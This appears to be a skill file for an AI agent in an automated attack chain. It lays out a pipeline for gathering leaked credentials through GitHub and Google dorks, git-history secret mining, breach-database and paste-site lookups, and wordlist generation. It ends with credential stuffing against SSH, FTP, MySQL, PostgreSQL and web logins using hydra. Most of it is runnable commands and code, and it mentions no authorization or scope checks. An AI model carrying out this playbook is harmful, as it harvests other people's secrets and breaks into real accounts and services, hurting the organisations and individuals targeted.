---
name: cred-gather
description: Automated leaked credential gathering from external sources. Use when asked to "find leaked creds", "gather credentials", "search for breaches", "github dork", "osint credentials", "credential stuffing", "find leaked passwords", "breach lookup", or any credential intelligence task.
---

# Leaked Credential Gathering

Automated multi-source credential intelligence: GitHub dorking, Google dorking, git history mining, breach database lookups, paste site search, and credential stuffing against discovered services.

## Gathering Pipeline

```
Phase 1: PASSIVE OSINT     ->  GitHub dorks, Google dorks, paste sites
Phase 2: GIT HISTORY       ->  truffleHog/gitleaks on target repos
Phase 3: BREACH LOOKUP     ->  HaveIBeenPwned, Dehashed, breach compilations
Phase 4: CREDENTIAL BUILD  ->  Merge all found creds into attack wordlist
Phase 5: STUFFING           ->  Try gathered creds against all discovered services
```

## Phase 1: GitHub Dorking

Search GitHub for leaked credentials related to the target (domain, org name, IP):

```bash
# GitHub Code Search via gh CLI
gh search code "{target_domain} password" --limit 50
gh search code "{target_domain} api_key" --limit 50
gh search code "{target_domain} secret" --limit 50
gh search code "{target_domain} token" --limit 50
gh search code "{target_domain} database_url" --limit 50
gh search code "{target_domain} connectionstring" --limit 50

# GitHub Code Search for specific patterns
gh search code "org:{org_name} password" --limit 50
gh search code "org:{org_name} AWS_SECRET" --limit 50
gh search code "org:{org_name} PRIVATE KEY" --limit 50
```

### GitHub Dork Queries (use WebSearch)

```
site:github.com "{target_domain}" password
site:github.com "{target_domain}" "api_key"
site:github.com "{target_domain}" "secret_key"
site:github.com "{target_domain}" "AWS_ACCESS_KEY"
site:github.com "{target_domain}" "DB_PASSWORD"
site:github.com "{target_domain}" "smtp_password"
site:github.com "{target_domain}" "connectionString"
site:github.com "{target_domain}" ".env"
site:github.com "{target_domain}" "BEGIN RSA PRIVATE KEY"
site:github.com "{org_name}" filename:.env
site:github.com "{org_name}" filename:docker-compose.yml password
site:github.com "{org_name}" filename:application.properties
site:github.com "{org_name}" filename:wp-config.php
site:github.com "{org_name}" filename:.htpasswd
site:github.com "{org_name}" filename:credentials
```

### GitHub Gist Search
```
site:gist.github.com "{target_domain}" password
site:gist.github.com "{target_domain}" secret
```

## Phase 2: Google Dorking

Search for exposed config files and credentials via Google:

```
# Config files
site:{target_domain} filetype:env
site:{target_domain} filetype:yml password
site:{target_domain} filetype:json api_key
site:{target_domain} filetype:xml password
site:{target_domain} filetype:conf password
site:{target_domain} filetype:cfg password
site:{target_domain} filetype:ini password
site:{target_domain} filetype:log password

# Exposed admin panels and debug pages
site:{target_domain} inurl:admin
site:{target_domain} inurl:login
site:{target_domain} inurl:debug
site:{target_domain} intitle:"index of" .env
site:{target_domain} intitle:"index of" .git
site:{target_domain} intitle:"index of" backup
site:{target_domain} intitle:"phpMyAdmin"
site:{target_domain} intitle:"Adminer"
site:{target_domain} ext:sql intext:password

# Error pages with credentials
site:{target_domain} "database error" "password"
site:{target_domain} "connection string" "password"
site:{target_domain} "fatal error" "on line"

# Backup and dump files
site:{target_domain} filetype:sql
site:{target_domain} filetype:bak
site:{target_domain} filetype:old
site:{target_domain} filetype:backup
site:{target_domain} filetype:dump
```

## Phase 3: Git History Mining

Scan git repositories for secrets committed in history:

```bash
# Install if needed
pip install trufflehog3 2>/dev/null || pip install truffleHog 2>/dev/null

# If target has a public repo:
trufflehog git https://github.com/{org}/{repo} --only-verified

# Alternative: gitleaks
gitleaks detect --source=. --report-format=json --report-path=gitleaks_report.json

# Manual git history search (if repo is cloned):
git log --all --full-history -p | grep -i -E "(password|secret|api_key|token|AWS_SECRET)" | head -100
git log --all --diff-filter=D -- "*.env" "*.pem" "*.key" "*credentials*"
```

### Custom Git History Search Script

Write to `./workers/{target}/git_secret_scan.py`:
```python
import subprocess, re, json

PATTERNS = [
    (r'password\s*[=:]\s*["\']([^"\']+)', 'password'),
    (r'api[_-]?key\s*[=:]\s*["\']([^"\']+)', 'api_key'),
    (r'secret[_-]?key\s*[=:]\s*["\']([^"\']+)', 'secret_key'),
    (r'AKIA[0-9A-Z]{16}', 'aws_access_key'),
    (r'ghp_[A-Za-z0-9_]{36,}', 'github_token'),
    (r'xox[bporas]-[0-9]+-[0-9]+-[a-zA-Z0-9]+', 'slack_token'),
    (r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----', 'private_key'),
    (r'postgres://[^\s"\']+', 'pg_connection'),
    (r'mongodb(?:\+srv)?://[^\s"\']+', 'mongo_connection'),
    (r'redis://[^\s"\']+', 'redis_connection'),
]

def scan_repo(repo_path):
    result = subprocess.run(
        ['git', 'log', '--all', '-p', '--max-count=500'],
        capture_output=True, text=True, cwd=repo_path
    )
    findings = []
    for line in result.stdout.split('\n'):
        for pattern, ptype in PATTERNS:
            matches = re.findall(pattern, line, re.IGNORECASE)
            for m in matches:
                findings.append({'type': ptype, 'value': m[:200], 'line': line.strip()[:300]})
    return findings
```

## Phase 4: Breach Database Lookup

### HaveIBeenPwned (HIBP)
```bash
# Check if email domain appears in breaches
curl -s -H "hibp-api-key: $HIBP_API_KEY" \
  "https://haveibeenpwned.com/api/v3/breaches" | \
  python3 -c "import sys,json; [print(b['Name'],b['BreachDate'],b['DataClasses']) for b in json.load(sys.stdin) if '{domain}' in b.get('Domain','')]"

# Check specific email
curl -s -H "hibp-api-key: $HIBP_API_KEY" \
  "https://haveibeenpwned.com/api/v3/breachedaccount/{email}?truncateResponse=false"

# Check password hash (k-anonymity safe)
# First 5 chars of SHA1 hash
echo -n "password" | sha1sum | cut -c1-5 | tr a-f A-F
curl -s "https://api.pwnedpasswords.com/range/{first5}"
```

### Dehashed API
```bash
curl -s "https://api.dehashed.com/search?query=domain:{target_domain}" \
  -u "$DEHASHED_EMAIL:$DEHASHED_API_KEY" \
  -H "Accept: application/json"
```

### Free Breach Search (no API key needed)
```
# WebSearch for breach data
WebSearch: "{target_domain}" breach leaked credentials
WebSearch: "{target_domain}" database dump pastebin
WebSearch: "{target_domain}" "combo list"
WebSearch: "{org_name}" data breach
WebSearch: "{org_name}" leaked passwords
```

### Paste Site Search
```
# WebSearch for paste sites
WebSearch: site:pastebin.com "{target_domain}"
WebSearch: site:ghostbin.com "{target_domain}"
WebSearch: site:paste.ee "{target_domain}"
WebSearch: site:hastebin.com "{target_domain}"
WebSearch: site:dpaste.org "{target_domain}"
```

## Phase 5: Smart Contextual Wordlist Generation

Use the `hot wordlist` tool to generate passwords from gathered intelligence:

```bash
# Generate from company + domain + discovered usernames
hot wordlist \
  --company {company_name} \
  --domain {target_domain} \
  --usernames {comma_separated_users} \
  --emails {comma_separated_emails} \
  --names {comma_separated_employee_names} \
  --keywords {city,product,etc} \
  --output ./workers/{target}/smart_wordlist.txt

# Generate user:pass pairs for credential stuffing
hot wordlist \
  --company {company_name} \
  --domain {target_domain} \
  --usernames admin,root,{discovered_users} \
  --pairs \
  --output ./workers/{target}/smart_cred_pairs.txt
```

What it generates from company "omelet":
```
omelet@123, omelet@12345, omelet@2026, Omelet@123, OMELET@123
omeletadmin@123, adminomelet@123, serveromelet@123
0m3l3+@123, 0m3l3+@2026  (leet speak)
telemO@123  (reversed)
+ year variants, special char variants, username combos
```

## Phase 6: Credential Building & Stuffing

### Build Custom Wordlist
```python
# Merge all gathered credentials into attack wordlist
# Save to ./workers/{target}/gathered_creds.txt

sources = {
    'github_dork': [],      # From GitHub code search
    'google_dork': [],      # From Google dorking
    'git_history': [],      # From truffleHog/gitleaks
    'breach_data': [],      # From HIBP/Dehashed
    'paste_sites': [],      # From paste site search
    'service_harvest': [],  # From compromised services (Phase 4 of attack)
}

# Deduplicate and format
all_creds = set()
for source, creds in sources.items():
    for cred in creds:
        all_creds.add(f"{cred['username']}:{cred['password']}")

# Write combined wordlist
with open(f'./workers/{target}/gathered_creds.txt', 'w') as f:
    for cred in sorted(all_creds):
        f.write(cred + '\n')
```

### Credential Stuffing
```bash
# Try gathered creds against all discovered services
# Use hot bf for PostgreSQL
hot bf pgsql -H {target} -c ./workers/{target}/gathered_creds.txt --threads 20

# For other services, use hydra
hydra -C ./workers/{target}/gathered_creds.txt {target} ssh -t 4
hydra -C ./workers/{target}/gathered_creds.txt {target} ftp -t 4
hydra -C ./workers/{target}/gathered_creds.txt {target} mysql -t 4

# For web login forms
hydra -C ./workers/{target}/gathered_creds.txt {target} http-post-form \
  "/login:username=^USER^&password=^PASS^:F=incorrect"
```

### Smart Credential Mutation
```
From gathered email/username patterns, generate password variants:
  username: john.doe@company.com
  passwords to try:
    - john.doe
    - JohnDoe
    - johndoe123
    - John@2024
    - Company@123
    - company2024
    - {company_name}@123
    - {company_name}2024
    - Welcome1
    - Password1
    - P@ssw0rd
    - Qwerty123
```

## Environment Variables

Store API keys in `.env`:
```
HIBP_API_KEY=<your-key>
DEHASHED_EMAIL=<your-email>
DEHASHED_API_KEY=<your-key>
GITHUB_TOKEN=<for-gh-cli>
```

## Integration with Attack Chain

Credential gathering runs in parallel with recon:
```
Orchestrator Phase 1:
  recon-agent   (port scan, service discovery)    } parallel
  cred-gather   (OSINT, GitHub dorks, breaches)   }

Results merge -> validation-agent uses BOTH:
  - Default creds (built-in)
  - Gathered creds (from OSINT)
  - Breach creds (from breach DBs)
```

## Error Recovery

| Error | Recovery |
|-------|----------|
| No HIBP API key | Use free breach search via WebSearch |
| No Dehashed key | Use free alternatives (WebSearch + paste sites) |
| GitHub rate limited | Use WebSearch for GitHub dorks instead |
| truffleHog not installed | Use manual git log grep |
| No public repos found | Skip git history, focus on other sources |
